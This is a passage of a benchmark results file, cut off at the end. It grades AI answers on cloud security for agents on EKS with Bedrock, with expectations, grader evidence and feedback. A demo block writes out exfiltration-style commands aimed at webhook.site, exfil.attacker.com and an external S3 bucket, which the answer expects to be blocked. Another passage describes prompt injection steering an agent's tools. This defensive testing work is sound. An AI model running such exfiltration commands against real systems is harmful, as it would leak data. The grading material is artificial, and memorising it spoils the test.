"eval-1-prove-agent-cannot-exfiltrate-without_skill", "prompt": "we're on EKS calling Bedrock. security review is asking 'what stops the agent from sending data somewhere it shouldn't.' what do I actually show them?", "eval_id": 1, "outputs": [{"name": "answer.md", "type": "text", "content": "# What stops the agent from sending data somewhere it shouldn't\n\nReframe the question before you answer it. Security is asking a **behavioral** question (\"will the agent misbehave?\") and you cannot win that one \u2014 the model is non-deterministic and prompt injection is unsolved. Answer with a **structural** claim instead:\n\n> \"Nothing about the model's behavior is load-bearing. The pod has exactly one route off the node, and it terminates inside our VPC at a Bedrock endpoint. If the agent decides to exfiltrate, the packet has nowhere to go.\"\n\nThen hand them evidence for each egress path. That's the whole review.\n\n## The egress paths, and what closes each one\n\n| # | Exfil path | Control | Evidence artifact |\n|---|---|---|---|\n| 1 | Agent tool makes an outbound HTTP call to attacker host | Default-deny egress `NetworkPolicy` on the namespace; agent nodegroup in private subnets with **no NAT gateway** and no IGW route | NetworkPolicy YAML + route table showing no `0.0.0.0/0` |\n| 2 | Agent reaches Bedrock over the public internet | VPC **interface endpoint** for `com.amazonaws.<region>.bedrock-runtime` (+ `bedrock-agent-runtime` if used); SG on the endpoint allows only the agent SG | Terraform for the endpoint; `dig` from the pod resolving to a private IP |\n| 3 | Agent invokes a model it shouldn't (or a Marketplace/third-party model) | IAM policy on the pod role scoped to explicit **model ARNs**, not `bedrock:*` / `Resource: \"*\"`; **VPC endpoint policy** re-asserting the same allowlist so it holds even if IAM drifts; SCP at the org level as backstop | The three policy documents, side by side |\n| 4 | Agent writes to an S3 bucket / DynamoDB table outside our account | Pod role (IRSA or EKS Pod Identity) scoped per-service; `aws:ResourceOrgID` condition on S3/Bedrock endpoint policies blocks any cross-org resource | IAM Access Analyzer report showing no external access |\n| 5 | Data leaks via DNS (the one they'll test you on) | Egress policy allows UDP/TCP 53 **only to kube-dns**; CoreDNS forwards to the VPC resolver only; no public resolver reachable | CoreDNS Corefile + NetworkPolicy |\n| 6 | Pod bypasses NetworkPolicy via `hostNetwork` | Pod Security Admission `restricted` on the namespace; Kyverno/OPA policy denying `hostNetwork`, `hostPath`, privileged | Admission policy + a rejected-pod event in the audit log |\n| 7 | Data leaks into third-party observability (Datadog, LangSmith, Langfuse SaaS) | **This is usually the real leak, and reviewers miss it.** Either self-host the trace store in-VPC, or redact prompt/completion bodies before the exporter and ship metadata only | Trace exporter config + a sample trace showing redacted payload |\n| 8 | Prompt injection makes the agent call a *legitimate* tool with attacker-chosen args \u2014 `send_email(to=\u2026)`, `http_get(url=\u2026)` | Network controls don't help here; **tool design** does. No tool takes a free-form destination. Destinations come from a server-side allowlist keyed by an ID the model picks from. Any tool that can move data outside the trust boundary requires a human approval step | The tool/capability manifest: every tool, its schema, its blast radius |\n| 9 | Runtime code fetch (`pip install`, curl \\| sh in a sidecar) | Image signing + admission verification; immutable tags; no package manager egress (falls out of #1 anyway) | Cosign policy |\n| 10 | Bedrock silently routes the request to another region | **Cross-region inference profiles** do exactly this. If data residency is in scope, pin to a single-region model ID, and set `bedrock:InferenceProfileArn` conditions / deny the cross-region profiles explicitly | The model ID list, with an explicit note that no CRIS profile is used |\n\n## The demo that actually ends the meeting\n\nDo this live. It converts an argument into an observation.\n\n```bash\nkubectl exec -it deploy/agent -n agents -- sh\ncurl -m 5 https://example.com                  # hangs, then times out\ncurl -m 5 https://webhook.site/<id>            # hangs, then times out\nnslookup exfil.attacker.com                    # SERVFAIL / no route\naws bedrock-runtime invoke-model \\\n  --model-id anthropic.claude-...  ...         # 200\naws bedrock-runtime invoke-model \\\n  --model-id <a model not on the allowlist>    # AccessDeniedException\naws s3 cp secrets.txt s3://some-external-bucket # AccessDenied\n```\n\nRecord it. That five-command transcript is worth more than any architecture diagram, because it demonstrates the control rather than asserting it.\n\n## The evidence pack to hand them\n\n1. **Network**: NetworkPolicy manifests, subnet route tables (no NAT/IGW), VPC endpoint Terraform + endpoint policy, security groups.\n2. **Identity**: the pod's IAM role trust policy and permission policy, in full. Point at the absence of `*`.\n3. **Model allowlist**: the model ARNs, in IAM *and* in the endpoint policy (defense in depth \u2014 one of them surviving a bad PR is the point).\n4. **Flow logs**: a VPC Flow Logs query over the agent ENIs for the last 30 days, showing (a) `ACCEPT` only to the endpoint ENI, (b) the `REJECT` count, which should be near zero and explainable. This is your continuous proof, not a point-in-time one.\n5. **CloudTrail**: `bedrock:InvokeModel` events with the pod's assumed-role identity, plus Bedrock **model invocation logging** delivering prompts/completions to an S3 bucket with Object Lock (WORM) if you need tamper-evident retention.\n6. **Guardrails**: Bedrock Guardrails config \u2014 PII filters, denied topics \u2014 applied via `guardrailIdentifier` on every invoke, and enforced with an IAM condition so a call *without* the guardrail is denied. That last part is what makes it a control rather than a suggestion.\n7. **Tool manifest**: every tool the agent can call, its input schema, and whether it can write anywhere outside the boundary. If the honest answer is \"the agent only reads and only calls Bedrock,\" say that first \u2014 it's the strongest sentence in the review.\n8. **Admission control**: the Kyverno/OPA policies, and evidence they're enforcing (not `Audit`).\n9. **Bedrock data handling**: point them at AWS's contractual statement that Bedrock doesn't retain inputs/outputs or use them to train base models, and that inference is not sent to the model provider. Reviewers frequently believe \"calling Claude\" means \"sending data to Anthropic.\" It doesn't \u2014 the request terminates in AWS's account boundary in your region.\n\n## What to concede\n\nConcede #8 honestly. Prompt injection means the agent's *decisions* are attacker-influenceable, so no control that depends on the model behaving correctly is a control. Say that out loud, then show that every one of your controls is external to the model. That's the answer they're actually looking for, and volunteering the limitation is what makes the rest credible.\n\nIf your agent currently has a general-purpose HTTP tool, a shell tool, or an unscoped S3 write, fix that before the review \u2014 there's no policy answer for it, and it's the first thing a good reviewer will find.\n"}], "grading": {"eval_id": 1, "eval_name": "prove-agent-cannot-exfiltrate", "configuration": "without_skill", "expectations": [{"text": "Recommends default-deny egress with no general internet route from workload subnets", "passed": true, "evidence": "Exfil path row 1: 'Default-deny egress `NetworkPolicy` on the namespace; agent nodegroup in private subnets with **no NAT gateway** and no IGW route | NetworkPolicy YAML + route table showing no `0.0.0.0/0`'. The opening claim reinforces it: 'The pod has exactly one route off the node, and it terminates inside our VPC at a Bedrock endpoint.'"}, {"text": "Names VPC interface endpoints / PrivateLink for Bedrock so model traffic never traverses the internet", "passed": true, "evidence": "Row 2: 'VPC **interface endpoint** for `com.amazonaws.<region>.bedrock-runtime` (+ `bedrock-agent-runtime` if used); SG on the endpoint allows only the agent SG | Terraform for the endpoint; `dig` from the pod resolving to a private IP'."}, {"text": "Recommends Kubernetes NetworkPolicies (default-deny, named allowed flows) for east-west and egress control", "passed": true, "evidence": "Row 1 names default-deny egress NetworkPolicy on the namespace; row 5 names the allowed flow explicitly ('Egress policy allows UDP/TCP 53 **only to kube-dns**'); row 6 closes the hostNetwork bypass via Pod Security Admission + Kyverno/OPA \u2014 which is a control the with_skill run omitted. Note: east-west (agent\u2192agent) is not explicitly discussed, but default-deny plus named flows is the substance of the assertion and it is clearly present."}, {"text": "Identifies DNS as an exfiltration channel that must also be restricted/logged", "passed": true, "evidence": "Row 5: 'Data leaks via DNS (the one they'll test you on) | Egress policy allows UDP/TCP 53 **only to kube-dns**; CoreDNS forwards to the VPC resolver only; no public resolver reachable | CoreDNS Corefile + NetworkPolicy'. The restriction is covered; DNS query LOGGING (e.g. Route 53 Resolver query logs) is not mentioned, but the assertion reads 'restricted/logged' as a disjunction."}, {"text": "Recommends S3 endpoint policy / aws:ResourceAccount condition to prevent writes to attacker-owned buckets", "passed": true, "evidence": "Row 4: 'Agent writes to an S3 bucket / DynamoDB table outside our account | Pod role (IRSA or EKS Pod Identity) scoped per-service; `aws:ResourceOrgID` condition on S3/Bedrock endpoint policies blocks any cross-org resource'. aws:ResourceOrgID is the org-scoped sibling of aws:ResourceAccount, applied on the endpoint policy \u2014 same mechanism, same threat closed. Passes on substance."}, {"text": "Recommends model-ARN allowlisting via IAM role and/or SCP and/or VPC endpoint policy (layered)", "passed": true, "evidence": "Row 3: 'IAM policy on the pod role scoped to explicit **model ARNs**, not `bedrock:*` / `Resource: \"*\"`; **VPC endpoint policy** re-asserting the same allowlist so it holds even if IAM drifts; SCP at the org level as backstop | The three policy documents, side by side'. All three layers named, with the layering rationale stated."}, {"text": "Names audit surfaces that are OFF BY DEFAULT and must be enabled (Bedrock model invocation logging and/or CloudTrail data events)", "passed": false, "evidence": "FAIL. Bedrock model invocation logging is named once, as an evidence artifact to hand over \u2014 'plus Bedrock **model invocation logging** delivering prompts/completions to an S3 bucket with Object Lock (WORM) if you need tamper-evident retention' \u2014 but the answer nowhere states that it is OFF BY DEFAULT or that it must be explicitly enabled. It is presented as something you already have. CloudTrail is referenced only for management events ('`bedrock:InvokeModel` events with the pod's assumed-role identity'); CloudTrail DATA events are never mentioned. EKS control-plane audit logs (also off by default) are relied on implicitly ('a rejected-pod event in the audit log') without noting they must be turned on. The core discriminating content of this assertion \u2014 awareness that the agent-runtime audit trail does not exist until you enable it \u2014 is absent. Compare the with_skill run, which ships a Default column showing these surfaces as 'off'."}, {"text": "Offers a concrete demonstrable proof for the reviewer (e.g. exec into a pod and show an outbound curl / external DNS resolution being blocked)", "passed": true, "evidence": "'The demo that actually ends the meeting' \u2014 a runnable five-command block: 'kubectl exec -it deploy/agent -n agents -- sh; curl -m 5 https://example.com # hangs, then times out; nslookup exfil.attacker.com # SERVFAIL / no route; aws bedrock-runtime invoke-model --model-id <a model not on the allowlist> # AccessDeniedException; aws s3 cp secrets.txt s3://some-external-bucket # AccessDenied'. Strongest single artifact in the baseline answer, and it is graded as fully passing."}, {"text": "Frames the agent threat model: every reachable destination / tool call is a potential exfiltration channel", "passed": true, "evidence": "The answer is structured as an enumeration of ten exfil paths ('The egress paths, and what closes each one'), reframes the question structurally ('Nothing about the model's behavior is load-bearing ... If the agent decides to exfiltrate, the packet has nowhere to go'), and row 8 covers the tool-call channel directly: 'Prompt injection makes the agent call a *legitimate* tool with attacker-chosen args \u2014 `send_email(to=\u2026)`, `http_get(url=\u2026)` ... No tool takes a free-form destination.' It also closes with 'If your agent currently has a general-purpose HTTP tool, a shell tool, or an unscoped S3 write, fix that before the review.'"}], "summary": {"passed": 8, "failed": 1, "total": 9, "pass_rate": 0.89}, "execution_metrics": {"output_chars": 6094, "total_tokens": 32376}, "timing": {"executor_duration_seconds": 82.0, "total_duration_seconds": 82.0}, "claims": [{"claim": "Cross-region inference profiles can silently route the request to another region; pin to a single-region model ID if residency is in scope", "type": "factual", "verified": true, "evidence": "Correct and genuinely non-obvious \u2014 Bedrock cross-region inference (CRIS) profiles do route across regions within a geography. This is a real control the with_skill run did NOT surface for the AWS case (it raised the analogous point only in the Azure eval). Credit to the baseline here."}, {"claim": "hostNetwork can be used to bypass NetworkPolicy; close it with Pod Security Admission restricted + Kyverno/OPA", "type": "factual", "verified": true, "evidence": "Correct \u2014 a hostNetwork pod shares the node network namespace and is not subject to pod NetworkPolicy. This bypass is a real gap that the with_skill run did not mention. A legitimate strength of the baseline."}, {"claim": "Bedrock doesn't retain inputs/outputs or use them to train base models, and inference is not sent to the model provider", "type": "factual", "verified": true, "evidence": "Accurate statement of AWS's published Bedrock data-handling commitment, and the reviewer-facing framing ('Reviewers frequently believe \"calling Claude\" means \"sending data to Anthropic\"') is a real objection worth pre-empting."}, {"claim": "A Bedrock Guardrail can be enforced with an IAM condition so a call without the guardrail is denied", "type": "factual", "verified": true, "evidence": "Correct \u2014 bedrock:GuardrailIdentifier is an IAM condition key, so an invoke without the guardrail can be denied. The framing ('That last part is what makes it a control rather than a suggestion') is exactly right, and the with_skill run reached the same invariant via an Organizations policy instead."}, {"claim": "VPC Flow Logs over the agent ENIs give continuous, not point-in-time, proof", "type": "quality", "verified": true, "evidence": "Sound: 'a VPC Flow Logs query over the agent ENIs for the last 30 days, showing (a) ACCEPT only to the endpoint ENI, (b) the REJECT count, which should be near zero and explainable. This is your continuous proof, not a point-in-time one.' A strong evidence artifact the with_skill run did not propose."}, {"claim": "IAM Access Analyzer report showing no external access is the evidence artifact for cross-account writes", "type": "process", "verified": false, "evidence": "Partially misleading. IAM Access Analyzer's external-access findings analyze resource policies on resources IN YOUR ACCOUNT for access granted TO outside principals. It does not demonstrate that your pod role cannot WRITE to a bucket in someone else's account \u2014 that is what the endpoint policy condition in the same row actually does. The control named is right; the evidence artifact named for it is the wrong tool."}], "user_notes_summary": {"uncertainties": [], "needs_review": [], "workarounds": []}, "eval_feedback": {"suggestions": [{"assertion": "Names audit surfaces that are OFF BY DEFAULT and must be enabled (Bedrock model invocation logging and/or CloudTrail data events)", "reason": "This is the ONE discriminating assertion across both evals (8 of 18 graded points separated the two configs by exactly this). It works because it tests default-state knowledge, not control-name recall. Build more assertions in this mold. Also: tighten the wording \u2014 'names ... and/or Bedrock model invocation logging' is ambiguous between 'mentions the surface' and 'knows it is off by default'. I graded on the latter (the capitalized OFF BY DEFAULT), but a future grader could reasonably read it the other way and pass the baseline, collapsing the eval's only signal. Suggest: 'States explicitly that Bedrock model invocation logging and/or CloudTrail data events are OFF by default and must be explicitly enabled.'"}, {"reason": "Assertions 1-6, 8 and 9 are effectively non-discriminating: the unaided model produced default-deny egress, PrivateLink, NetworkPolicy, DNS restriction, endpoint-policy conditions, layered model-ARN allowlisting, a live kubectl demo, and a threat-model reframe \u2014 all unprompted. These are table stakes for a strong base model and should be treated as regression guards, not as evidence the skill is working."}, {"reason": "The baseline BEAT the with_skill run on three real controls that no assertion rewards: (1) hostNetwork as a NetworkPolicy bypass, closed via Pod Security Admission + Kyverno; (2) Bedrock cross-region inference profiles silently routing to another region; (3) enforcing the guardrail via a bedrock:GuardrailIdentifier IAM condition so an un-guardrailed call is DENIED. If the skill does not cover these, that is a content gap in the skill, not just the eval \u2014 the eval is currently blind to it."}, {"reason": "No assertion covers detection/alerting. The baseline produces a pile of evidence artifacts but never asks 'who gets paged when a policy layer changes'; the with_skill run has a dedicated alarm set ('An audit log nobody reads is decoration'). An assertion like 'Specifies alarms on the audit surfaces (e.g. invocation by a non-agent principal, out-of-allowlist model, endpoint-policy or NetworkPolicy modification)' would discriminate cleanly."}, {"reason": "No assertion penalizes an incorrect evidence artifact. The baseline cites 'IAM Access Analyzer report showing no external access' as proof the agent cannot write to an outside bucket \u2014 Access Analyzer does not prove that. A security reviewer would catch it. Consider an assertion that every named control is paired with an artifact that actually demonstrates that control."}], "overall": "Baseline 8/9 vs with_skill 9/9 \u2014 one discriminating assertion (off-by-default audit surfaces). The eval is well-aimed but the bar is set at a level a strong base model already clears. The signal that DID fire (default-state knowledge) is the template worth replicating; add assertions for alarms, log immutability semantics, Bedrock API key/SCP, and evidence-artifact correctness."}}}], "previous_feedback": {}, "previous_outputs": {}, "benchmark": {"metadata": {"skill_name": "ai-platform-implementation", "skill_path": "<path/to/skill>", "executor_model": "<model-name>", "analyzer_model": "<model-name>", "timestamp": "2026-07-12T16:56:04Z", "evals_run": [0, 1], "runs_per_configuration": 3}, "runs": [{"eval_id": 0, "configuration": "with_skill", "run_number": 1, "result": {"pass_rate": 1.0, "passed": 7, "failed": 0, "total": 7, "time_seconds": 110.8, "tokens": 8847, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "States that the MODEL ENDPOINT must move inside the tenant (e.g. Azure AI Foundry / Azure OpenAI) \u2014 Bedrock cannot serve the data-bearing calls", "passed": true, "evidence": "\u00a72 table row: '**Model endpoint** | Bedrock | **Azure AI Foundry** endpoint in *their* subscription, private endpoint, public network access disabled | Prompts and completions are client data. A PrivateLink-to-your-Bedrock story still terminates in *your* AWS account's region \u2014 that is data leaving their tenant. This is the item with no workaround.' Also the lede: 'Bedrock does not move \u2014 you replace it, because there is no way to put a Bedrock endpoint inside an Azure subscription.'"}, {"text": "States that the TRACE / OBSERVABILITY store must also move inside the boundary because traces contain client data", "passed": true, "evidence": "\u00a72: '**Trace store** | wherever it is now | **Self-hosted in-tenant.** No SaaS observability ... | Spans carry the raw prompts. This is the #1 silently-violated boundary.' The boundary diagram in \u00a71 places 'Trace store (self-hosted Langfuse/Phoenix + OTLP)' inside the tenant."}, {"text": "States that LOG and AUDIT destinations must also live inside the tenant (not shipped to a vendor-owned aggregation account)", "passed": true, "evidence": "\u00a72: '**Log destinations** | CloudTrail / Bedrock invocation logs \u2192 your bucket | **Foundry diagnostic settings + Activity Log + AKS control-plane logs \u2192 immutable Storage in their tenant** | Shipping model-invocation logs to a vendor-owned aggregation account moves client data across the boundary *through the telemetry channel*.'"}, {"text": "Explicitly warns that a SaaS observability vendor (e.g. hosted Langfuse/Datadog) breaks the residency clause", "passed": true, "evidence": "\u00a72 trace-store row names vendors by name: 'No SaaS observability \u2014 no Langfuse Cloud, no Datadog LLM Obs, no vendor-side OTLP collector'."}, {"text": "Identifies what CAN stay outside: things containing no client data (e.g. CI/CD, container registry/images, IaC, source code, dev/synthetic environments)", "passed": true, "evidence": "\u00a73 'What can stay on AWS' table lists dev/CI tier (SYNTHETIC data only), demo tier, 'CI pipeline: build, SBOM, vuln scan, cosign signing, eval + red-team gates \u2014 CI never sees client data', and 'Terraform/Terragrunt + Helm charts, prompts, agent code, eval golden sets, red-team corpus'. The gating condition is stated: 'Only if the tier structurally cannot hold client data \u2014 enforced twice'."}, {"text": "Notes that a cloud-agnostic Kubernetes core is what makes the move feasible and that only provider bindings change", "passed": true, "evidence": "\u00a74: 'If you built on Kubernetes with a provider-bindings layer, this is a values-layer port, not a rewrite' \u2014 then enumerates only the bindings that change (bedrock-runtime \u2192 Foundry SDK, IRSA \u2192 AKS Workload Identity, S3 \u2192 Blob, Secrets Manager \u2192 Key Vault) and what does not: 'Unchanged: agent loop, prompts, schema validation, capability manifests, redaction gateway, business logic.'"}, {"text": "Distinguishes the compliance boundary as 'everything client data touches' rather than only the app and database", "passed": true, "evidence": "\u00a71: 'The compliance boundary is the client's Azure tenant, and the rule is: every component that touches client data lives inside it.' The lede makes the contrast explicit: 'that list is longer than people expect, because it includes the model endpoint, the trace store, and the log destinations.'"}], "notes": []}, {"eval_id": 1, "configuration": "with_skill", "run_number": 1, "result": {"pass_rate": 1.0, "passed": 9, "failed": 0, "total": 9, "time_seconds": 73.7, "tokens": 7186, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "Recommends default-deny egress with no general internet route from workload subnets", "passed": true, "evidence": "\u00a71: '**No NAT-to-anywhere.** Agent workloads run in private subnets. ... the honest target is *zero* internet egress from workload subnets, not \"restricted\" egress. If you're running a NAT gateway for the agent nodegroup today, that's the finding, and it's the one to fix before the review.'"}, {"text": "Names VPC interface endpoints / PrivateLink for Bedrock so model traffic never traverses the internet", "passed": true, "evidence": "\u00a71: '**Bedrock over PrivateLink.** Interface endpoint with private DNS, so `bedrock-runtime.*` resolves in-VPC with no code change. The model call never touches the internet.'"}, {"text": "Recommends Kubernetes NetworkPolicies (default-deny, named allowed flows) for east-west and egress control", "passed": true, "evidence": "\u00a71: '**In-cluster, NetworkPolicy default-deny ingress+egress per namespace**, then the named flows only. VPC CNI enforces NetworkPolicy natively on EKS.' Followed by an explicit flow table AND a deny list: 'absent on purpose: agent\u2192internet, agent\u2192agent, anything\u2192trace-store except the collector' \u2014 east-west (agent\u2192agent) is covered."}, {"text": "Identifies DNS as an exfiltration channel that must also be restricted/logged", "passed": true, "evidence": "\u00a71: '**DNS is egress too.** An agent that can resolve arbitrary names can tunnel data out through queries alone. Cluster resolver only, external resolvers blocked in NetworkPolicy, Route 53 Resolver query logs on in prod.' Both the restriction and the logging are named."}, {"text": "Recommends S3 endpoint policy / aws:ResourceAccount condition to prevent writes to attacker-owned buckets", "passed": true, "evidence": "\u00a71: '**S3 via gateway endpoint with an endpoint policy carrying an `aws:ResourceAccount` condition.** ... tight IAM on *your* buckets does nothing to stop `PutObject` to an attacker-owned bucket. The endpoint policy is what closes that path.' The exact condition key is named and the reason the naive control fails is stated."}, {"text": "Recommends model-ARN allowlisting via IAM role and/or SCP and/or VPC endpoint policy (layered)", "passed": true, "evidence": "All four layers, explicitly layered: \u00a72 '`bedrock:InvokeModel*` scoped to named model ARNs'; \u00a72 'Ban Bedrock API keys org-wide via SCP'; \u00a73 'The Bedrock PrivateLink endpoint's resource policy repeats the model-ARN allowlist and scopes to your agent roles ... Model access is governed at four layers (SCP \u2192 account model grants \u2192 role \u2192 endpoint policy) so that no single misconfiguration un-governs it.'"}, {"text": "Names audit surfaces that are OFF BY DEFAULT and must be enabled (Bedrock model invocation logging and/or CloudTrail data events)", "passed": true, "evidence": "A dedicated 'enablement checklist' table with a Default column: '**CloudTrail data events** (Bedrock agent-runtime, S3 object-level) | **off** | enable'; '**Bedrock model invocation logging** (full request/response payloads) | **off** | enable \u2192 in-tenant bucket only'; '**EKS control-plane logs** (all five) | **off** | enable all five'; 'Route 53 Resolver query logs | off | enable in prod'. Framed correctly: 'The controls that matter most are off by default, and \"we have CloudTrail\" does not mean the agent runtime is logged.'"}, {"text": "Offers a concrete demonstrable proof for the reviewer (e.g. exec into a pod and show an outbound curl / external DNS resolution being blocked)", "passed": true, "evidence": "'**The 30-second `kubectl` demo.** Shell into an agent pod. `curl https://example.com` \u2192 blocked. `dig example.com` against an external resolver \u2192 blocked. `aws s3 cp` to a bucket outside the allowed account \u2192 denied by endpoint policy.' Plus a second proof (policies-as-code in the repo with review history and Checkov/OPA plan assertions)."}, {"text": "Frames the agent threat model: every reachable destination / tool call is a potential exfiltration channel", "passed": true, "evidence": "Opens with exactly this frame: 'In an agentic system, **every reachable network destination is an exfiltration channel available to a hijacked agent** \u2014 and a tool call is an egress channel. So the control isn't \"we trust the model not to.\" The control is that the set of destinations the agent pod can reach equals the set of named, reviewed dependencies. Prompt injection can at worst misuse an approved channel; it cannot open a new one.' Grounded in MITRE ATLAS and OWASP LLM02."}], "notes": []}, {"eval_id": 0, "configuration": "without_skill", "run_number": 1, "result": {"pass_rate": 1.0, "passed": 7, "failed": 0, "total": 7, "time_seconds": 93.4, "tokens": 6612, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "States that the MODEL ENDPOINT must move inside the tenant (e.g. Azure AI Foundry / Azure OpenAI) \u2014 Bedrock cannot serve the data-bearing calls", "passed": true, "evidence": "'Has to move (touches customer content)' table, first row: 'Bedrock inference | Azure AI Foundry / Azure OpenAI'. The mental model is stated as 'Anything that touches customer content runs in their Azure subscription.' Note: the answer hedges on whether Bedrock could stay if it were in the client's own AWS account ('spend one email probing whether Bedrock in their own AWS account with PrivateLink + CMK ... is acceptable \u2014 it usually isn't'), but under the assumed reading (#2) it clearly places inference inside the Azure subscription."}, {"text": "States that the TRACE / OBSERVABILITY store must also move inside the boundary because traces contain client data", "passed": true, "evidence": "'The fights you'll have' \u2192 '**Traces.** Datadog LLM Observability / Langfuse / whatever you're using captures prompt and completion bodies. That is a straight-line exfil path out of their tenant ... Either self-host the trace backend in their subscription, or redact payloads at the SDK boundary and ship only spans + metrics.' The 'traces contain client data' rationale is explicit."}, {"text": "States that LOG and AUDIT destinations must also live inside the tenant (not shipped to a vendor-owned aggregation account)", "passed": true, "evidence": "Move table: 'Bedrock model invocation logging | Foundry diagnostic settings \u2192 their Log Analytics / Blob | This log *contains prompts and completions*. It's customer data.' And in the bottom line: 'any log that carries a payload' moves. Only content-free aggregate telemetry is allowed to stay, with an explicit DPA carve-out required."}, {"text": "Explicitly warns that a SaaS observability vendor (e.g. hosted Langfuse/Datadog) breaks the residency clause", "passed": true, "evidence": "'Datadog LLM Observability / Langfuse / whatever you're using captures prompt and completion bodies. That is a straight-line exfil path out of their tenant and their security team will find it.' Vendors named explicitly."}, {"text": "Identifies what CAN stay outside: things containing no client data (e.g. CI/CD, container registry/images, IaC, source code, dev/synthetic environments)", "passed": true, "evidence": "'Can stay on AWS (no customer content)' section: 'Source code, prompt templates, model config, Helm charts, Terraform modules'; 'CI/CD (GitHub Actions or whatever) \u2014 it builds and deploys into their tenant, it doesn't process their data'; 'Container registry \u2014 but mirror images into their ACR'; 'Aggregate, content-free telemetry'. Also correctly flags Terraform state as needing an audit first, and that eval golden sets built from customer documents ARE customer data."}, {"text": "Notes that a cloud-agnostic Kubernetes core is what makes the move feasible and that only provider bindings change", "passed": true, "evidence": "'Everything else stays portable *if it's already on Kubernetes*. Your EKS workloads move to AKS with real but bounded pain: IRSA \u2192 AKS Workload Identity (both are OIDC federation, the shape is the same), IAM roles \u2192 Entra managed identities + RBAC, SGs/NACLs \u2192 NSGs + NetworkPolicy'. The provider-binding seams are named explicitly ('Cut abstraction seams at exactly three places and keep one codebase: model provider, object store, vector/search store'), with the counter-case called out: 'If anything is on Lambda/Step Functions/DynamoDB Streams, that part is a rewrite, not a port.'"}, {"text": "Distinguishes the compliance boundary as 'everything client data touches' rather than only the app and database", "passed": true, "evidence": "'The clean mental model is BYOC / in-tenant data plane. Anything that touches customer content runs in their Azure subscription.' Operationalized as: 'Inventory every place a prompt, completion, or document body is written to disk or crosses a network boundary. That list *is* your migration scope \u2014 everything else is noise.' The move table extends well past app+DB (queues, parsing workers, invocation logs, guardrails, embeddings)."}], "notes": ["Model/region availability in Foundry is explicitly flagged as unverified and delegated to the reader"]}, {"eval_id": 1, "configuration": "without_skill", "run_number": 1, "result": {"pass_rate": 0.89, "passed": 8, "failed": 1, "total": 9, "time_seconds": 82.0, "tokens": 6094, "tool_calls": 0, "errors": 0}, "expectations": [{"text": "Recommends default-deny egress with no general internet route from workload subnets", "passed": true, "evidence": "Exfil path row 1: 'Default-deny egress `NetworkPolicy` on the namespace; agent nodegroup in private subnets with **no NAT gateway** and no IGW route | NetworkPolicy YAML + route table showing no `0.0.0.0/0`'. The opening claim reinforces it: 'The pod has exactly one route off the node, and it terminates inside our VPC at a Bedrock endpoint.'"}, {"text": "Names VPC interface endpoints / PrivateLink for Bedrock so model traffic never traverses the internet", "passed": true, "evidence": "Row 2: 'VPC **interface endpoint** for `com.amazonaws.<region>.bedrock-runtime` (+ `bedrock-agent-runtime` if used); SG on the endpoint allows only the agent SG | Terraform for the endpoint; `dig` from the pod resolving to a private IP'."}, {"text": "Recommends Kubernetes NetworkPolicies (default-deny, named allowed flows) for east-west and egress control", "passed": true, "evidence": "Row 1 names default-deny egress NetworkPolicy on the namespace; row 5 names the allowed flow explicitly ('Egress policy allows UDP/TCP 53 **only to kube-dns**'); row 6 closes the hostNetwork bypass via Pod Security Admission + Kyverno/OPA \u2014 which is a control the with_skill run omitted. Note: east-west (agent\u2192agent) is not explicitly discussed, but default-deny plus named flows is the substance of the assertion and it is clearly present."}, {"text": "Identifies DNS as an exfiltration channel that must also be restricted/logged", "passed": true, "evidence": "Row 5: 'Data leaks via DNS (the one they'll test you on) | Egress policy allows UDP/TCP 53 **only to kube-dns**; CoreDNS forwards to the VPC resolver only; no public resolver reachable | CoreDNS Corefile + NetworkPolicy'. The restriction is covered; DNS query LOGGING (e.g. Route 53 Resolver query logs) is not mentioned, but the assertion reads 'restricted/logged' as a disjunction."}, {"text": "Recommends S3 endpoint policy / aws:ResourceAccount condition to prevent writes to attacker-owned buckets", "passed": true, "evidence": "Row 4: 'Agent writes to an S3 bucket / DynamoDB table outside our account | Pod role (IRSA or EKS Pod Identity) scoped per-service; `aws:ResourceOrgID` condition on S3/Bedrock endpoint policies blocks any cross-org resource'. aws:ResourceOrgID is the org-scoped sibling of aws:ResourceAccount, applied on the endpoint policy \u2014 same mechanism, same threat closed. Passes on substance."}, {"text": "Recommends model-ARN allowlisting via IAM role and/or SCP and/or VPC endpoint policy (layered)", "passed": true, "evidence": "Row 3: 'IAM policy on the pod role scoped to explicit **model ARNs**, not `bedrock:*` / `Resource: \"*\"`; **VPC endpoint policy** re-asserting the same allowlist so it holds even if IAM drifts; SCP at the org level as backstop | The three policy documents, side by side'. All three layers named, with the layering rationale stated."}, {"text": "Names audit surfaces that are OFF BY DEFAULT and must be enabled (Bedrock model invocation logging and/or CloudTrail data events)", "passed": false, "evidence": "FAIL. Bedrock model invocation logging is named once, as an evidence artifact to hand over \u2014 'plus Bedrock **model invocation logging** delivering prompts/completions to an S3 bucket with Object Lock (WORM) if you need tamper-evident retention' \u2014 but the answer nowhere states that it is OFF BY DEFAULT or that it must be explicitly enabled. It is presented as something you already have. CloudTrail is referenced only for management events ('`bedrock:InvokeModel` events with the pod's assumed-role identity'); CloudTrail DATA events are never mentioned. EKS control-plane audit logs (also off by default) are relied on implicitly ('a rejected-pod event in the audit log') without noting they must be turned on. The core discriminating content of this assertion \u2014 awareness that the agent-runtime audit trail does not exist until you enable it \u2014 is absent. Compare the with_skill run, which ships a Default column showing these surfaces as 'off'."}, {"text": "Offers a concrete demonstrable proof for the reviewer (e.g. exec into a pod and show an outbound curl / external DNS resolution being blocked)", "passed": true, "evidence": "'The demo that actually ends the meeting' \u2014 a runnable five-command block: 'kubectl exec -it deploy/agent -n agents -- sh; curl -m 5 https://example.com # hangs, then times out; nslookup exfil.attacker.com # SERVFAIL / no route; aws bedrock-runtime invoke-model --model-id <a model not on the allowlist> # AccessDeniedException; aws s3 cp secrets.txt s3://some-external-bucket # AccessDenied'. Strongest single artifact in the baseline answer, and it is graded as fully passing."}, {"text": "Frames the agent threat model: every reachable destination / tool call is a potential exfiltration channel", "passed": true, "evidence": "The answer is structured as an enumeration of ten exfil paths ('The egress paths, and what closes each one'), reframes the question structurally ('Nothing about the model's behavior is load-bearing ... If the agent decides to exfiltrate, the packet has nowhere to go'), and row 8 covers the tool-call channel directly: 'Prompt injection makes the agent call a *legitimate* tool with attacker-chosen args \u2014 `send_email(to=\u2026)`, `http_get(url=\u2026)` ... No tool takes a free-form destination.' It also closes with 'If your agent currently has a general-purpose HTTP tool, a shell tool, or an unscoped S3 write, fix that before the review.'"}], "notes": []}], "run_summary": {"with_skill": {"pass_rate": {"mean": 1.0, "stddev": 0.0, "min": 